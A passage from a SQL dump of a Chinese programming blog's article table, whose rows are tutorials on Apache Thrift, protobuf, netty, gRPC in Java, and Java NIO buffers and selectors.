*是一种指针类型，常用在函数参数、函数返回值中需要兼容不同指针类型的地方。我们可以将别的类型的指针无需强制类型转换的赋值给void *类型。也可以将void *强制类型转换成任何别的指针类型，', 0, 0, 71, 0, 0, '2019-07-01 21:06:19', '2019-07-02 13:24:24', 0, 0);
INSERT INTO `article` VALUES (71, 1, 'apache thrfit的rpc基本使用', '2019/7/1561991242_3079d35197480a3248231f3cd0b61a73.jpg', '### 概念\n#### apache thrfit是什么\n1. thrfit最初由facebook研发,主要用于各个服务之间的RPC通信,支持跨语言,常用的语言比如C++,Java,Python...\n2. thrfit是一个典型的CS结构,客户端和服务端可以使用不同的语言开发,既然客户端和服务端能使用不同语言开发,\n那么一定就要有一种中间语言来关联客户端和服务端的语言,这种语言就是IDL(Interface Description Language)\n3. 不同http,这种基于socket的连接方式极其高效,是最常用也是非常有效的连接方式\n\n#### thrift工作原理\n1. 定义编写thrift文件,由thrift文件(DL)生成,双方语言的接口,model,在生成的model以及接口中会有解码编码的api代码\n2. 调用相应生成的api即可完成接口间的调用通信\n3. 数据传输使用socket(多种语言均支持),数据再以特定的格式(string等)发送,接收方语言进行解析\n\n### 依赖及示范代码\n链接：https://pan.baidu.com/s/1CMhOCaWk6tX2vzVfT5l7tw \n提取码：18fy\n\n### 目的\n![mude.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567153239_mude.png)\n1. 编写data.thrift文件,根据thrift提供的文档格式以及自身需求进行编写\n2. 使用thrift命令生成所需的语言实现文件\n3. 编写客户端与服务端根据thrift所生成的文件完成rpc调用\n\n### 下载thrift并配置环境变量\n![download1.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567153239_download1.png)\n![download2.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567153239_download2.png)\n\n![huanjbianl.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567154642_huanjbianl.png)\n\n### 导入依赖\n![importpackage.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567155056_importpackage.png)\n```java\n// maven\n<dependency>\n  <groupId>org.apache.thrift</groupId>\n  <artifactId>libthrift</artifactId>\n  <version>0.12.0</version>\n</dependency>\n\n// gradle\ncompile \'org.apache.thrift:libthrift:0.12.0\'\n```\n\n\n### 编写thrift文件\n![thriftfile.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567153239_thriftfile.png)\n```java\nnamespace java thrift.generated\nnamespace py thrift.generated\n\ntypedef i16 short\ntypedef i32 int\ntypedef i64 long\ntypedef bool boolean\ntypedef string String\n\nstruct Person {\n    1: optional String username,\n    2: optional int age,\n    3: optional boolean married\n}\n\nexception DataException {\n    1: optional String message,\n    2: optional String callStack,\n    3: optional String date\n}\n\nservice PersonService {\n    Person getPersonByUsername(1: required String username) throws (1: DataException dataException),\n    void savePerson(1: required Person person) throws (1: DataException dataException)\n} \n```\n\n### thrift命令生成实现文件\n![shengchengshixian.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567153239_shengchengshixian.png)\n```java\nthrift --gen java src/thrift/data.thrift\n```\n\n### 编写服务端\n![serverimpl.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567153239_serverimpl.png)\n![server.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567153239_server.png) \n\n### 编写客户端\n![client.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567155407_client.png)\n\n## thrift语法\n### 数据类型与结构体等\n#### thrift数据类型\n```java\n// thrift不支持无符号,因为很多编程语言不存在无符号类型,比如Java\nbyte: 有符号字节\ni16: 16位有符号整数\ni32: 32位有符号整数\ni64: 64位有符号整数\ndouble: 64位浮点数\nstring: 字符串\n```\n#### thrift容器类型\n```java\n// thrift集合中元素可以是除了service之外的任何类型,包括exception\nlist: 一系列由T类型的数据组成的有序列表,元素可以重复\nset: 一系列由T类型的数据组成的无序集合,元素不可重复\nmap: 一个字典结构,key为K类型,value为V类型,相当于Java中的hashmap\n```\n#### 结构体struct\n```java\n// 就像C语言一样,Thrift支持struct类型,目的就是将一些数据聚合在一起,方便传输管理,struct的定义如下\nstruct People {\n	1: string name;\n	2: i32 age;\n	3: string gender;\n} \n```\n#### 枚举enum\n```java\n// 枚举的定义形式和Java的Enum定义类似\nenum Gender {\n	MALE,\n	FEMALE\n}\n```\n#### 异常exception\n```java\n// thrift支持自定义exception,规则与struct一样\nexception RequestException {\n	1: i32 code;\n	2: string reason;\n}\n```\n#### 服务service\n```java\n// thrift定义服务相当于Java中创建interface一样,创建的service经过代码生成命令之后就会生成客户端和服务端的框架代码\n// 定义形式如下:\nservice HelloWorldService {\n	// service中定义的函数,相当于JavaInterface中定义的方法\n	string doAction(1: string name, 2: i32 age);\n}\n```\n#### 类型别名定义typedef\n```java\n// thrift支持类似c++一样的typedef定义\ntypedef i32 int\ntypedef i64 long\n```\n#### 常量const\n```java\n// thrift也支持常量定义,使用const关键字\nconst i32 MAX_RETRIES_TIME = 10\nconst string MY_WEBSITE = \"http://facebook.com\"\n```\n#### 命名空间namespace\n```java\n// thrift的命名空间相当于Java中package的意思,主要目的是组织代码,thrift使用关键字namespace定义命名空间\n// 格式是: namespace 语言名 路径\nnamespace java com.test.thrift.demo\n```\n#### 文件包含include\n```java\n// thrift也支持文件包含,相当于C/C++中的include,java中的import,使用关键字include定义\ninclude \"global.thrift\"\n```\n#### 注释\n```java\n// thrift注释方式支持shell风格的注释,支持C/C++风格的注释\n// 即#和//开头的语句都当作注释,/**/包裹的语句也是注释\n```\n#### 可选和必须optional和required\n```java\n// thrift提供两个关键字required,optional,分别用于表示对应的字段是必填的还是可选的\n// 建议都使用optional,required不方便扩展\nstruct People {\n	required string name;\n	optional i32 age;\n}\n```\n\n\n\n\n\n\n### 传输相关api\n#### 传输格式\n```java\nTBinaryProtocol: 二进制格式\nTCompactProtocol: 压缩格式\nTJSONProtocol: JSON格式\nTSimpleJSONProtocol: 提供JSON只写协议,生成的文件很容易通过脚本语言解析\nTDebugProtocol: 使用易懂的可读的文本格式,以便于debug\n```\n#### 数据传输方式\n```java\nTSocket: 阻塞式socket\nTFrameTransport: 以frame为单位进行传输,非阻塞式服务中使用\nTFileTransport: 以文件形式进行传输\nTMemoryTransport: 将内存用于I/O,Java实现时内部实际使用了简单的ByteArrayOutputStream\nTZlibTrasnsport: 使用zlib进行压缩,与其他传输方式联合使用,当前无Java实现 \n```\n#### 支持的服务模型\n```java\nTSimpleServer: 简单的单线程服务模型,长用于测试\nTThreadPoolServer: 多线程服务模型,使用标准的阻塞式IO\nTNoneblockingServer: 多线程服务模型,使用非阻塞式IO(需使用TFramedTransport数据传输方式)\nHsHaServer: THsHa引入了线程池去处理,其模型把读写任务放到线程池去处理,Half-sync/Half-async的处理模式,Half-async是在处理IO事件上(accept/read/writeio),Half-sync用于handler对rpc的同步处理 \n```\n###### 完整系统学习建议查看官方文档样例', 0, 0, 59, 0, 0, '2019-07-01 22:27:31', '2019-08-30 21:24:58', 0, 0);
INSERT INTO `article` VALUES (72, 1, 'protobuf基本使用', '2019/8/1567167582_pid71913070.jpg', '### 概念 \n#### google protocolBuffer是什么\n1. protocolBuffer是Google的语言中立,平台中立,可扩展的机制,用于序列化结构化数据.相比于xml,更小，更快，更简单。\n2. 可以定义数据的结构化结构，然后使用特殊生成的源代码轻松地将结构化数据写入和读取各种数据流，并使用各种语言\n\n### 依赖及示范代码\n链接：https://pan.baidu.com/s/1zLuOm4GOgzCA7_QTn5MRwQ \n提取码：w94m\n\n### 目的\n![protobufmude.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567170021_protobufmude.png)\n1. 编写.proto文件,,根据protobuf提供的文档格式以及自身需求进行编写\n2. 使用protoc命令生成所需的语言实现文件\n3. 使用所生成的文件完成对象数据的序列化与解析\n\n### 下载protoc并配置环境变量\n![download1.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567170020_download1.png)\n![download2.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567170021_download2.png)\n\n### 导入依赖\n![gradeimportpackage.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567170021_gradeimportpackage.png)\n```java\n// maven\n<dependency>\n  <groupId>com.google.protobuf</groupId>\n  <artifactId>protobuf-java</artifactId>\n  <version>3.9.1</version>\n  <type>bundle</type>\n</dependency>\n<dependency>\n  <groupId>com.google.protobuf</groupId>\n  <artifactId>protobuf-java-util</artifactId>\n  <version>3.9.1</version>\n  <type>bundle</type>\n</dependency>\n// gradle\ncompile \'com.google.protobuf:protobuf-java:3.9.1\'\ncompile \'com.google.protobuf:protobuf-java-util:3.9.1\'\n```\n### 编写proto文件\n![protobuffile.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567170021_protobuffile.png)\n```java\nsyntax = \'proto2\';\n\npackage com.tuwq.protobuf;\n\noption optimize_for = SPEED;\noption java_package = \"com.tuwq.protobuf\";\noption java_outer_classname = \"DataInfo\";\n\nmessage Student {\n    required string name = 1;\n    optional int32 age = 2;\n    optional string address = 3;\n}\n```\n### protoc命令生成实现文件\n![protocfileshengcheng.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567170021_protocfileshengcheng.png)\n```java\nprotoc --java_out=src/main/java src/protobuf/Student.proto\n```\n\n### 编写代码进行序列化与解析\n![protobuftestcode.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567170021_protobuftestcode.png)\n```java\npublic class ProtoBufTest {\n    public static void main(String[] args) throws Exception {\n        DataInfo.Student student = DataInfo.Student.newBuilder()\n                .setName(\"张三\").setAge(20).setAddress(\"北京\").build();\n        byte[] student2ByteArray = student.toByteArray();\n        DataInfo.Student student2 = DataInfo.Student.parseFrom(student2ByteArray);\n\n        System.out.println(student2);\n        System.out.println(student2.getName());\n        System.out.println(student2.getAge());\n        System.out.println(student2.getAddress());\n    }\n}\n```\n## protobuf语法\n### 官方例子\n```java\nsyntax = \"proto2\";\n\npackage tutorial;\n\noption java_package = \"com.example.tutorial\";\noption java_outer_classname = \"AddressBookProtos\";\n\nmessage Person {\n  required string name = 1;\n  required int32 id = 2;\n  optional string email = 3;\n\n  enum PhoneType {\n    MOBILE = 0;\n    HOME = 1;\n    WORK = 2;\n  }\n\n  message PhoneNumber {\n    required string number = 1;\n    optional PhoneType type = 2 [default = HOME];\n  }\n\n  repeated PhoneNumber phones = 4;\n}\n\nmessage AddressBook {\n  repeated Person people = 1;\n}\n```\n#### package\n```java\n// .proto文件以包声明开头，这有助于防止不同项目之间的命名冲突,即使指定了java_package也应该指定package\npackage tutorial;\n```\n#### java_package\n```java\n// 指定生成的类应该以什么Java包名称存在。\n// 如果没有明确指定它，它只是匹配包声明给出的包名\n// 但这些名称通常不是合适的Java包名（因为它们通常不以域名开头）\noption java_package = \"com.example.tutorial\";\n```\n#### java_outer_classname\n```java\n// 定义包含此文件中所有类的类名。 如果未明确提供java_outer_classname，则将通过将文件名转换为camel case来生成它。 \n// 例如，默认情况下，“my_proto.proto”将使用“MyProto”作为外部类名。\noption java_outer_classname = \"AddressBookProtos\";\n```\n#### message\n```java\n// 消息只是包含一组类型字段的聚合。 \n// 许多标准的简单数据类型都可用作字段类型，包括bool，int32，float，double和string\n// 您还可以使用其他消息类型作为字段类型向消息中添加更多结构\n// 您甚至可以定义嵌套在其他消息中的消息类型\nmessage Person {\n  required string name = 1;\n  required int32 id = 2;\n  optional string email = 3;\n\n  enum PhoneType {\n    MOBILE = 0;\n    HOME = 1;\n    WORK = 2;\n  }\n\n  message PhoneNumber {\n    required string number = 1;\n    optional PhoneType type = 2 [default = HOME];\n  }\n\n  repeated PhoneNumber phones = 4;\n}\n```\n#### enum\n```java\n// 定义枚举类型,指定枚举值\nenum PhoneType {\n    MOBILE = 0;\n    HOME = 1;\n    WORK = 2;\n}\n```\n### 属性字段与方法\n#### 属性标识\n```java\n// 每个元素上的“= 1”，“= 2”标记标识该字段在二进制编码中使用的唯一“标记”。\n// 标签号1-15需要少于一个字节来编码而不是更高的数字，因此作为优化，您可以决定将这些标签用于常用或重复的元素\n// 将标签16和更高版本留给不太常用的可选元素。 \n// 重复字段中的每个元素都需要重新编码标记号，因此重复字段特别适合此优化\nrequired string name = 1;\nrequired int32 id = 2;\noptional string email = 3;\n```\n\n#### 属性字段\n```java\n// 不推荐使用required,容易出现问题,建议使用optional\n	required: 必填,否则该消息将被视为“未初始化”。 尝试构建未初始化的消息将抛出RuntimeException。 \n解析未初始化的消息将抛出IOException\n	optional: 可选,可以设置也可以不设置该字段。 如果未设置可选字段值，则使用默认值。 \n	repeated: 该字段可以重复任意次数（包括零）。 重复值的顺序将保留在协议缓冲区中。 \n将重复字段视为动态大小的数组\n```\n#### 消息对象方法\n```java\nisInitialized(): 检查是否已设置所有必填字段。\ntoString(): 对象信息,调试用途\nmergeFrom(Message other): 将其他消息对象内容合并到此消息中,覆盖奇异标量字段,合并复合字段以及连接重复字段\nclear(builder only): 将所有字段清除回空状态\n```\n#### 序列化与反序列化\n```java\nbyte[] toByteArray(): 序列化消息并返回包含其原始字节的字节数组\nstatic Person parseFrom(byte[] data): 解析来自给定字节数组的消息\nvoid writeTo(OutputStream output): 序列化消息并将其写入OutputStream\nstatic Person parseFrom(InputStream input): 从InputStream读取和解析消息\n```\n###### 完整系统学习建议查看官方文档样例', 0, 0, 30, 0, 0, '2019-08-30 20:20:03', '2019-08-30 21:24:44', 0, 0);
INSERT INTO `article` VALUES (73, 1, 'netty使用protobuf进行通信', '2019/8/1567175866_pid73143110.jpg', '### 依赖及示范代码\n链接：https://pan.baidu.com/s/1zLuOm4GOgzCA7_QTn5MRwQ 提取码：w94m\n\n### 目的\n![nettyprotobufmude.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567176208_nettyprotobufmude.png)\n1. 编写.proto文件,,根据protobuf提供的文档格式以及自身需求进行编写\n2. 使用protoc命令生成所需的语言实现文件\n3. 编写netty客户端与服务端,添加采用netty自带对protobuf所支持的编解码器\n4. 双端采用protobuf所提供的编解码器,传输格式为二进制字节,相比其他传输格式更小，更快\n\n### 导入依赖 \n![protobufnettyimportpackage.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567176209_protobufnettyimportpackage.png)\n```java\n// gradle\ncompile group: \'io.netty\', name: \'netty-all\', version: \'4.1.10.Final\'\ncompile \'com.google.protobuf:protobuf-java:3.3.1\'\ncompile \'com.google.protobuf:protobuf-java-util:3.3.1\'\n```\n### 编写proto文件\n![protobufnettyfile.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567176209_protobufnettyfile.png)\n1. 采用枚举是为了便于处理不同的数据对象进行处理\n2. 就如http区别不同的访问路由做出不同的行为处理\n3. dataType=1,=2的处理逻辑不一样\n4. oneof是指dataBody这个属性值将下其中之一\n\n### protoc命令生成实现文件\n![protobufnettycmd.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567176209_protobufnettycmd.png)\n```java\nprotoc --java_out=src/main/java src/protobuf/Person.proto\n```\n\n### 编写客户端\n![client1.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567178546_client1.png)\n![client2.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567178546_client2.png)\n\n### 编写服务端\n![server1.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567178546_server1.png)\n![server2.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567178546_server2.png)', 0, 0, 28, 0, 0, '2019-08-30 22:38:03', '2019-08-30 23:23:49', 0, 0);
INSERT INTO `article` VALUES (74, 1, 'Java使用grpc调用', '2019/8/1567223588_mmexport1567218082065.jpg', '### 概念\n#### grpc是什么\n1. gRPC是一个现代的开源高性能RPC框架，可以在任何环境中运行。 它可以有效地连接数据中心内和跨数据中心的服务，并提供可插拔的支持，以实现负载平衡，跟踪，健康检查和身份验证\n2. 它还适用于分布式的通讯，用于将设备，移动应用程序和浏览器连接到后端服务。\n3. 基于http2,更为高效\n\n### 依赖及示范代码\n链接：https://pan.baidu.com/s/1-IUSZlXqpS5WcwaFdvGcLQ \n提取码：ci3s\n\n### 目的\n![grpcmude.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567223735_grpcmude.png)\n1. 编写.proto文件,,根据grpc提供的文档格式以及自身需求进行编写\n2. 使用grpc插件命令生成所需的语言实现文件\n3. 编写客户端与服务端根据grpc所生成的文件完成远程调用\n\n### 导入依赖和插件\n![importpackage1.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567223735_importpackage1.png)\n![importpackage2.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567223735_importpackage2.png)\n1. 注意使用auto_import时,先导入plugin插件,再apply引用插件,然后添加protobuf内容,否则ide可以会出现找不到插件导致build错误的情况\n2. 关于maven与详细内容,查看官方 https://github.com/grpc/grpc-java\n\n```java\napply plugin: \'java\'\napply plugin: \'com.google.protobuf\'\n\ngroup \'com.tuwq\'\nversion \'1.0\'\n\nsourceCompatibility = 1.8\ntargetCompatibility = 1.8\n\nbuildscript {\n    repositories {\n        mavenCentral()\n    }\n    dependencies {\n        classpath \'com.google.protobuf:protobuf-gradle-plugin:0.8.8\'\n    }\n}\n\nprotobuf {\n    protoc {\n        artifact = \"com.google.protobuf:protoc:3.9.0\"\n    }\n    plugins {\n        grpc {\n            artifact = \'io.grpc:protoc-gen-grpc-java:1.23.0\'\n        }\n    }\n    generateProtoTasks.generatedFilesBaseDir = \'src\' // <- that line\n    generateProtoTasks {\n        all()*.plugins {\n            grpc {\n                outputSubDir = \'java\'\n            }\n        }\n    }\n}\n\nrepositories {\n    mavenCentral()\n}\n\ntasks.withType(JavaCompile) {\n    options.encoding = \'UTF-8\'\n}\n\ndependencies {\n    testCompile group: \'junit\', name: \'junit\', version: \'4.12\'\n    compile \'io.grpc:grpc-netty-shaded:1.23.0\'\n    compile \'io.grpc:grpc-protobuf:1.23.0\'\n    compile \'io.grpc:grpc-stub:1.23.0\'\n}\n```\n### 编写proto文件\n![grpcfile.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567223735_grpcfile.png)\n```java\nsyntax = \"proto3\";\n\n// gradle generateProto\npackage com.tuwq.proto;\n\noption java_package = \"com.tuwq.proto\";\noption java_outer_classname = \"StudentProto\";\noption java_multiple_files = true;\n\nservice StudentService {\n    rpc GetRealNameByUsername(MyRequest) returns (MyResponse){}\n    rpc GetStudentsByAge(StudentRequest) returns (stream StudentResponse) {}\n    rpc GetStudentsWrapperByAges(stream StudentRequest) returns (StudentResponseList) {}\n    rpc BiTalk(stream StreamRequest) returns (stream StreamResponse) {}\n}\n\nmessage MyRequest {\n    string username = 1;\n}\nmessage MyResponse {\n    string realname = 2;\n}\nmessage StudentRequest {\n    int32 age = 1;\n}\nmessage StudentResponse {\n    string name = 1;\n    int32 age = 2;\n    string city = 3;\n}\nmessage StudentResponseList {\n    repeated StudentResponse studentResponse = 1;\n}\nmessage StreamRequest {\n    string request_info = 1;\n}\nmessage StreamResponse {\n    string response_info = 1;\n}\n```\n\n### grpc命令生成实现文件\n![grpccmd.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567223735_grpccmd.png)\n\n### 编写服务端\n![servlerimpl.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567223735_servlerimpl.png)\n![grpcserver1.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567223735_grpcserver1.png)\n\n### 编写客户端\n![grpcclient1.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567223734_grpcclient1.png)\n![grpcclient2.png](http://blog.img.tuwq.cn/upload/artimg/2019/8/1567224653_grpcclient2.png)\n\n###### 完整系统学习建议查看官方文档样例 https://grpc.io/docs/tutorials/basic/java/', 0, 0, 38, 0, 0, '2019-08-31 11:53:14', '2019-08-31 12:21:05', 0, 0);
INSERT INTO `article` VALUES (75, 1, 'NIO中allocate和allocateDirect区别', '2019/9/1567589869_mmexport1567218143005.jpg', '### 概念\n#### NIO中的Buffer创建方式包含两种(不含只读类型)\n```java\n// 它们在使用上只有细微的差异,然而在实现与效率上却有着天壤之别\n\n// 栈缓冲,返回对象HeapByteBuffer\nByteBuffer buffer = ByteBuffer.allocate(512);\n// 直接缓冲,返回对象DirectByteBuffer\nByteBuffer buffer2 = ByteBuffer.allocateDirect(512);\n```\n\n### 查看源码-HeapByteBuffer\n![heap1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1567591437_heap1.png)\n![heap2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1567591437_heap2.png)\n![heap3.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1567591438_heap3.png)\n1. allocate方法底层直接new出一个HeapByteBuffer对象,构造出相应数据,调用父构造就完成了,是纯粹的Java对象并且构造方法的实现包括成员变量等等都是在Java领域的,并没有用到native方法	\n2. 纯粹的Java对象,里面维护着一个字节数组,这个字节数组是真正用来存放着数据的源头,整个这些内容都是在Java这个领域当中,这个字节数组对象毫无疑问是在堆上面的\n3. 对于这个所生成的HeapByteBuffer它也位于堆上面的,因为new出来的对象一定是位于堆上面的,底层维护的字节数组也是在Java内存结构所管控的范围之内,换句话说,Java虚拟机是可以直接操控这块内存的,它们是属于Java领域内的\n\n### 查看源码-DirectByteBuffer\n![direct1.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1567593200_direct1.png)\n![direct2.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1567593200_direct2.png)\n![direct3.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1567593200_direct3.png)\n1. allocateDirect方法new出一个DirectByteBuffer对象,称之为直接字节缓冲,底层调用了oraclejdk的闭源包,调用闭源unsafe类分配内存相关内容,应用到了大量的native方法\n2. Buffer的address属性的官方注释上标明与directBuffer有关联\n\n### 区别图示\n![tushi.png](http://blog.img.tuwq.cn/upload/artimg/2019/9/1567594541_tushi.png)\n#### DirectByteBuffer由两部分来构成的\n1. 一部分称为Java,在jvm直接就能操控的内容,Java部分看到的内容就是DirectByteBuffer这个对象,所以它是位于Java堆上面的\n2. 一部分称为Native,不在Java范围之中,它不在堆上面,通常称之为堆外内存,native方法就会通过C/C++方式去生成内存\n3. 如果对C/C++有些了解的话,C中有malloc方法,通过这种原生方式来生成相应数据.这种属于在系统本地的内存空间,并不在Java的内存空间当中,所以它称之为堆外内存 \n\n#### address作用\n1. Java与Native它们两者之间必然存在关联关系,否则native生成后,Java没法操控数据了,所以必须通过一种引用的方式\n2. 引用的方式directByteBuffer中一定有某个成员变量,这个成员变量是可以访问到堆外内存的数据的\n3. 在抽象类buffer当中,发现成员变量long address,注释说明说这是只被directByteBuffer使用,address会引用到堆外内存的真正数据\naddress表示的是在堆外内存当中,所真正分配的内存数据的地址 \n4. 之前所使用到的heapByteBuffer,它所有的内存都是在Java堆上进行的,在jvm内存结构中是可以访问到的,也是在jvm的管控当中\n5. 然而,与之对应的directByteBuffer直接缓冲,直接缓冲对象本身它依然是位于堆上面的,因为它本身是个Java对象,然而它里面的有个address long类型的成员变量,这个long类型的成员变量表示的就是在堆外由操作系统,通过C/C+向操作系统申请的一块堆外内存,address表示的是堆外内存的地址,所以通过它的地址就能直接的去找到在堆外所生成的所分配的数据\n\n### 效率区别,直接缓冲区与非直接缓冲区\n![niobuffer.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1545632464_niobuffer.png)\n#### 对于HeapByteBuffer\n1. 如果使用heapByteBuffer,它在进行数据的读取或写入的时候,如果我们用的是间接的bytebuffer(heapbytebuff),那么这个内存包括它里面所封装的字节数组都是在Java堆上的\n2. 然而对于操作系统来说,*操作系统它并不是直接的就处理heapbyteBuffer在堆上所封装的字节数组*\n3. 操作系统实际上会在操作系统开辟一块内存区域,读取或写入时它实际是将Java堆上面的heapbuffer里面的字节数组内容给拷贝到它所开辟的内存某区域当中,然后再把这里面的数据拿出来进行跟IO设备进行数据的读取或写入\n4. 换句话说,如果我们所使用的时heapbytebuffer的话,它实际上*多了一次数据拷贝的过程*,会把Java内存空间当中的字节数组内容原封不动的拷贝到操作系统开辟的内存区域当中,这个内存区域会直接和IO设备进行交互\n\n#### 对于DirectByteBuffer\n1. 如果使用directByteBuffer,在Java堆上面就不会在存在一个所谓的字节数组了,因为*真正的数据就已经在堆外内存放着*,所以如果进行数据的读写的话,直接就由操作系统来去跟堆外内存进行交互,*少了数据拷贝的过程*,这种方式称之为*零拷贝*\n\n#### 为什么操作系统不直接操控堆上面的数据\n1. 并不是操作系统没法访问这块内存,内存地址一定是确定才能访问到内存区域,然而正在访问内存区域的时候,突然在这个内存区域发生了垃圾回收GC,除了CMS(并发标记清除)算法之外,其他垃圾回收都涉及到先标记再压缩这个过程\n2. 如果native正在操作数组的时候,GC正在进行内存数据移动的话,整个数据就乱套了,所以不能进行GC这种操作,那么显然,GC操作不能的话,那很可能会出现错误\n3. 除非让内存单个对象不去移动或者不让发生垃圾回收这种动作,但是不让发生垃圾回收动作就显然不可行的,所以这种方案就堵死了.\n通过原生代码去操作Java堆上内存的这种方式就堵死了\n\n#### 为什么Java采用了非直接缓冲的拷贝方式\n1. 把字节数组内存给拷贝到堆外上去,拷贝到堆外上去,实际基于这些条件,拷贝动作是比较快的,同时设备io操作速度又没有那么快,这种操作性价比就是比较高的事情,所以会执行这种拷贝的方式\n2. 拷贝的过程中是不会产生GC的,如果拷贝过程也产生GC的话,那么也是没有意义的,这一点上jvm做出了保证\n3. 把数据拷贝到操作系统所开辟的内存之后,那么事情就比较简单了,这个内存就由操作系统来把控了,至于内存释放,由于是操作系统开辟维护的,它相应的就会释放掉,所以不会出现内存泄漏的情况\n\n#### 关于直接缓冲的零拷贝\n1. 对于零拷贝,这个内存区域实际上,address会维护它的引用相当于它的地址,当Java堆上DirectByteBuffer被回收掉的时候,那么它就能找到相应的堆外的内存,接下来通过jni的方式就可以把堆外内存给回收掉,所以依然不会出现内存泄漏的情况\n2. directByteBuffer是存储在Java堆上面的标准Java对象,但是它持有着一个操作系统内存的引用,这个称之为直接内存模型\n3. 在这种直接内存模型之前,Java堆上的数据如果想要和外界进行交换的话,非jvm内存结构领域想要交换数据的话,必须要经过一个native堆,就是操作系统本地的堆,实现一次数据从Java堆拷贝到native堆的这么一个过程,然后再把它由native进行相应io操作,实际就多了一次没有意义的数据拷贝\n4. 如果直接使用堆外内存(直接内存)的话,那么通过这种直接内存就可以直接跟外设io进行打交道,这部分内存实际上在Java的堆外,通过这种方式实现zerocopy零拷贝概念和操作\n5. 所以对于Java里的bytebuffer来说呢,我们不考虑读写这个维度,只考虑直接间接,那么它实际上它有两种实现类,一种称之为直接缓冲区,另一种称之为非直接缓冲区或间接缓冲区,那么对于直接缓冲区来说,Java虚拟机就是可以直接进行本地的io操作,避免了在操作系统的原生io操作时还要复制内容到一个中间缓存区,这也被称为中间缓冲区', 0, 0, 48, 0, 0, '2019-09-04 17:38:12', '2019-09-04 19:50:07', 0, 0);
INSERT INTO `article` VALUES (76, 1, 'NIO的Selector对象多路复用器', '2019/9/1567599097_mmexport1567598370337.jpg', '### selector,内容来源jdk源码文档\n#### selector是什么\n1. java.nio中拥有3个核心概念: Selector,Channel与Buffer,Selector是其中最重要的概念\n2. Selector是一个或多个SelectableChannel*对象的多路复用器*\n3. selector的作用是Java NIO中管理一组多路复用的SelectableChannel对象，并能够识别通道是否为诸如*读写事件做好准备的组件*\n4. selector总体上编程模型是基于事件的处理方式,这种处理方式的应用度很广,并且其思想非常值得借鉴\n5. selector最重要的内容是selectionKeys,理解selector那么selectionkey非常非常重要\n\n#### 如何创建一个Selector\n```java\n Selector selector = Selector.open();\n```\n1. 一个*selector*对象可以通过调用*Selector.open()*来创建，这个工厂方法会使用系统默认的*selector provider*来创建一个新的selector对象。或者我们还可以通过实现抽象类*SelectorProvider*自定义一个*selector provider*，调用*new SelectorProviderImpl().openSelector()*来创建它。\n2. 除非调用*selector.close()*，否则该*selector*将会一直保持*打开状态*\n\n#### 如何将selectable channel注册到selector中\n```java\nServerSocketChannel serverSocketChannel = ServerSocketChannel.open(); // 创建Selector\nserverSocketChannel.configureBlocking(false); // channel要注册到Selector上就必须是非阻塞的，所以FileChannel是不可以使用Selector的，因为FileChannel是阻塞的\nserverSocketChannel.register(selector, SelectionKey.OP_ACCEPT); // 注册并接受接收事件\n```\n1. 通过channel的register方法，将channel注册到给定的selector中，并返回一个表示注册关系的SelectionKey 对象\n\n### Selector维护selectionKeys,内容来源jdk源码文档\n1. 一个可选择的channel注册到selector上,将它们注册,注册的结果是通过一个叫SelectionKey这个对象来表示的.一个selector会维护着*三种SelectionKey的集合*\n2. selectionKey表示着一些事件,比如连接过来了,这些连接是否可以接受,是不是有数据读过来了,是不是有数据可以往外写 \n\n#### 三种selectionKey集合\n1. **key set**: 包含着所有*selectionKeys*，当前所有注册到*selector*中的*channel*返回的注册关系*SelectionKey*都包含在内，这个集合可以通过*selector.keys()*方法返回。\n2. **selected-key set**: 包含着一部分*selectionKeys*，其中的每个*selectionKey*所关联的*channel*在*selection operation*期间被检测出至少 *准备好* 了一个可以在*兴趣集*中匹配到的操作。这个集合可以通过调用*selector.selectedKeys()*方法返回。selected-key set 一定是 key set 的子集。\n3. **cancelled-key set**: 也包含着一部分*selectionKeys*，其中的每个*selectionKey*都已经被*取消*，但是所关联*channel*还没有被撤销登记。cancelled-key set 不能够被直接返回，但也一定是 key set 的子集。 \n\n#### 注意事项\n1. 对于一个新创建的*selector*其中这三个集合都是空着的。\n2. 通过*channel*的*register*方法，一个*selectionKey*被增加到selector的 **key set** 中。 \n3. 无论通过*channel.close()*还是通过*selectionKey.cancel()*来取消一个*selectionKey* ，这个*selectionKey*都会被立即添加到*selector*的 **cancelled-key set** 中，但是所关联的*channel*并没有立即被*撤销登记*，直到发生下次 *selection operations*, 这些*channel*才被从*selector*中撤销登记，与此同时这些*Cancelled 